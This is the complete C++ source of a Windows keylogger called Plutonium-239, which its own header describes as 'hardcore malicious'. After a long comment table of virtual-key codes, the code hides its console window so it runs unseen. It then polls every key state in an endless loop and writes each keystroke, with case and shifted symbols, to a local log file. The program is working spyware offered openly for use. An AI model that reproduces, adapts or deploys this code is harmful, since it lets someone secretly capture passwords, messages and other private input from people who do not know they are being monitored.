/*****************FILE HEADER*****************

 * FILE NAME: Plutonium-239.cpp
 * 
 * DESCRIPTION: Plutonium-239 is a hardcore
 *              malicious keylogger developed
 *              by DJ & DK
 * 
 * AUTHOR: DJ
 *         DK

*********************************************/

#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <fstream>
#include <dos.h>
#include <wbemidl.h>
using namespace std;

void STARTUP();
void START_KEYLOGGING_ATTACK();


// FEW IMPORTANT KEY VALUE, USED IN THIS CODE...

/******* WIN32_API: Keyboard and mouse input *******
 *
 * CONSTANT	         HEX	    DESCRIPTION
 * -------------------------------------------------
 * 
 * VK_LBUTTON	     0x01	    Left mouse button
 * VK_RBUTTON	     0x02	    Right mouse button
 * VK_CANCEL	     0x03	    Control-break processing
 * VK_MBUTTON	     0x04	    Middle mouse button (three-button mouse)
 * VK_XBUTTON1	     0x05	    X1 mouse button
 * VK_XBUTTON2	     0x06	    X2 mouse button
 * -	             0x07	    Undefined
 * VK_BACK	         0x08	    BACKSPACE key
 * VK_TAB	         0x09	    TAB key
 * -	             0x0A-0B    Reserved
 * VK_CLEAR	         0x0C	    CLEAR key
 * VK_RETURN	     0x0D	    ENTER key
 * -	             0x0E-0F    Undefined
 * VK_SHIFT	         0x10	    SHIFT key
 * VK_CONTROL	     0x11	    CTRL key
 * VK_MENU	         0x12	    ALT key
 * VK_PAUSE	         0x13	    PAUSE key
 * VK_CAPITAL	     0x14	    CAPS LOCK key
 * VK_KANJI	         0x19	    IME Kanji mode
 * VK_IME_OFF	     0x1A	    IME Off
 * VK_ESCAPE	     0x1B	    ESC key
 * VK_CONVERT	     0x1C	    IME convert
 * VK_NONCONVERT	 0x1D	    IME nonconvert
 * VK_ACCEPT	     0x1E	    IME accept
 * VK_MODECHANGE	 0x1F	    IME mode change request
 * VK_SPACE	         0x20	    SPACEBAR
 * VK_PRIOR	         0x21	    PAGE UP key
 * VK_NEXT	         0x22	    PAGE DOWN key
 * VK_END	         0x23	    END key
 * VK_HOME	         0x24	    HOME key
 * VK_LEFT	         0x25	    LEFT ARROW key
 * VK_UP	         0x26	    UP ARROW key
 * VK_RIGHT	         0x27	    RIGHT ARROW key
 * VK_DOWN	         0x28	    DOWN ARROW key
 * VK_SELECT	     0x29	    SELECT key
 * VK_PRINT	         0x2A	    PRINT key
 * VK_EXECUTE	     0x2B	    EXECUTE key
 * VK_SNAPSHOT	     0x2C	    PRINT SCREEN key
 * VK_INSERT	     0x2D	    INS key
 * VK_DELETE	     0x2E	    DEL key
 * VK_HELP	         0x2F	    HELP key
 *                   0x30	    0 key
 *                   0x31	    1 key
 *                   0x32	    2 key
 *                   0x33	    3 key
 *                   0x34	    4 key
 *                   0x35	    5 key
 *                   0x36	    6 key
 *                   0x37	    7 key
 *                   0x38	    8 key
 *                   0x39	    9 key
 *                   0x41	    A key
 *                   0x42	    B key
 *                   0x43	    C key
 *                   0x44	    D key
 *                   0x45	    E key
 *                   0x46	    F key
 *                   0x47	    G key
 *                   0x48	    H key
 *                   0x49	    I key
 *                   0x4A	    J key
 *                   0x4B	    K key
 *                   0x4C	    L key
 *                   0x4D	    M key
 *                   0x4E	    N key
 *                   0x4F	    O key
 *                   0x50	    P key
 *                   0x51	    Q key
 *                   0x52	    R key
 *                   0x53	    S key
 *                   0x54	    T key
 *                   0x55	    U key
 *                   0x56	    V key
 *                   0x57	    W key
 *                   0x58	    X key
 *                   0x59	    Y key
 *                   0x5A	    Z key
 * VK_LWIN	         0x5B	    Left Windows key (Natural keyboard)
 * VK_RWIN	         0x5C	    Right Windows key (Natural keyboard)
 * VK_APPS	         0x5D	    Applications key (Natural keyboard)
 * -	             0x5E	    Reserved
 * VK_SLEEP	         0x5F	    Computer Sleep key
 * VK_NUMPAD0	     0x60	    Numeric keypad 0 key
 * VK_NUMPAD1	     0x61	    Numeric keypad 1 key
 * VK_NUMPAD2	     0x62	    Numeric keypad 2 key
 * VK_NUMPAD3	     0x63	    Numeric keypad 3 key
 * VK_NUMPAD4	     0x64	    Numeric keypad 4 key
 * VK_NUMPAD5	     0x65	    Numeric keypad 5 key
 * VK_NUMPAD6	     0x66	    Numeric keypad 6 key
 * VK_NUMPAD7	     0x67	    Numeric keypad 7 key
 * VK_NUMPAD8	     0x68	    Numeric keypad 8 key
 * VK_NUMPAD9	     0x69	    Numeric keypad 9 key
 * VK_MULTIPLY	     0x6A	    Multiply key
 * VK_ADD	         0x6B	    Add key
 * VK_SEPARATOR	     0x6C	    Separator key
 * VK_SUBTRACT	     0x6D	    Subtract key
 * VK_DECIMAL	     0x6E	    Decimal key
 * VK_DIVIDE	     0x6F	    Divide key
 * VK_F1	         0x70	    F1 key
 * VK_F2	         0x71	    F2 key
 * VK_F3	         0x72	    F3 key
 * VK_F4	         0x73	    F4 key
 * VK_F5	         0x74	    F5 key
 * VK_F6	         0x75	    F6 key
 * VK_F7	         0x76	    F7 key
 * VK_F8	         0x77	    F8 key
 * VK_F9	         0x78	    F9 key
 * VK_F10	         0x79	    F10 key
 * VK_F11	         0x7A	    F11 key
 * VK_F12	         0x7B	    F12 key
 * VK_F13	         0x7C	    F13 key
 * VK_F14	         0x7D	    F14 key
 * VK_F15	         0x7E	    F15 key
 * VK_F16	         0x7F	    F16 key
 * VK_F17	         0x80	    F17 key
 * VK_F18	         0x81	    F18 key
 * VK_F19	         0x82	    F19 key
 * VK_F20	         0x83	    F20 key
 * VK_F21	         0x84	    F21 key
 * VK_F22	         0x85	    F22 key
 * VK_F23	         0x86	    F23 key
 * VK_F24	         0x87	    F24 key
 * 
 * 
 * Convert Hex to Interger:
 * https://www.rapidtables.com/convert/number/hex-to-decimal.html
************************************************************/

int main()
{
    STARTUP();
    START_KEYLOGGING_ATTACK();

    return 0;
}

void STARTUP()
{

    // Making CMD Invisible for background process
    AllocConsole();
    HWND console = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(console, 0);
}

void START_KEYLOGGING_ATTACK()
{

    // Making a char for keyboard keypress
    unsigned char key;

    for (;;)
    {

        for (key = 8; key <= 222; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {

                // Initializing the file where key logs would be stored
                ofstream write("Plutonium-239.log", ios::app);

                // If keys are not in shift or caps lock
                if (((key > 64) && (key < 91)) && !((GetAsyncKeyState(0x10)) || (GetKeyState(0x14))))
                {
                    key += 32;
                    write << key;
                    write.close();
                    break;
                }

                // If keys are in both Caps Lock and shift
                else if (((key > 64) && (key < 91)) && ((GetAsyncKeyState(0x10)) && (GetKeyState(0x14))))
                {
                    key += 32;
                    write << key;
                    write.close();
                    break;
                }

                // If keys are in shift or caps lock
                else if ((key > 64) && (key < 91) && ((GetAsyncKeyState(0x10)) || (GetKeyState(0x14))))
                {
                    write << key;
                    write.close();
                    break;
                }

                // If keys are except the letter keys
                else
                {
                    switch (key)
                    {
                    case 48:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << ")";
                        else
                            write << "0";
                    }
                    break;

                    case 49:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "!";
                        else
                            write << "1";
                    }
                    break;

                    case 50:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "@";
                        else
                            write << "2";
                    }
                    break;
                    case 51:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "#";
                        else
                            write << "3";
                    }
                    break;
                    case 52:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "$";
                        else
                            write << "4";
                    }
                    break;
                    case 53:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "%";
                        else
                            write << "5";
                    }
                    break;
                    case 54:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "^";
                        else
                            write << "6";
                    }
                    break;
                    case 55:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "&";
                        else
                            write << "7";
                    }
                    break;
                    case 56:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "*";
                        else
                            write << "8";
                    }
                    break;
                    case 57:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "(";
                        else
                            write << "9";
                    }
                    break;
                    case 186:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << ":";
                        else
                            write << ";";
                    }
                    break;
                    case 187:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "+";
                        else
                            write << "=";
                    }
                    break;
                    case 188:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "<";
                        else
                            write << ",";
                    }
                    break;
                    case 189:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << "_";
                        else
                            write << "-";
                    }
                    break;
                    case 190:
                    {
                        write << ".";
                    }
                    break;
                    case 191:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << '?';
                        else
                            write << "/";
                    }
                    break;
                    case 192:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << '~';
                        else
                            write << "`";
                    }
                    break;
                    case 219:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << '{';
                        else
                            write << "[";
                    }
                    break;
                    case 221:
                    {
                        if (GetAsyncKeyState(0x10))
                            write << '}';
                        else
                            write << "]";
                    }
                    break;
                    case VK_SPACE:
                        write << " ";
                        break;
                    case VK_RETURN:
                        write << "\n<ENTER>\n";
                        break;
                    case VK_TAB:
                        write << "\n<TAB>\n";
                        break;
                    case VK_BACK:
                        write << "\n<BACKSPACE>\n";
                        break;
                    case VK_DELETE:
                        write << "\n<DELETE>\n";
                        break;

                    default:
                        break;
                    }
                }
            }
        }
    }
}
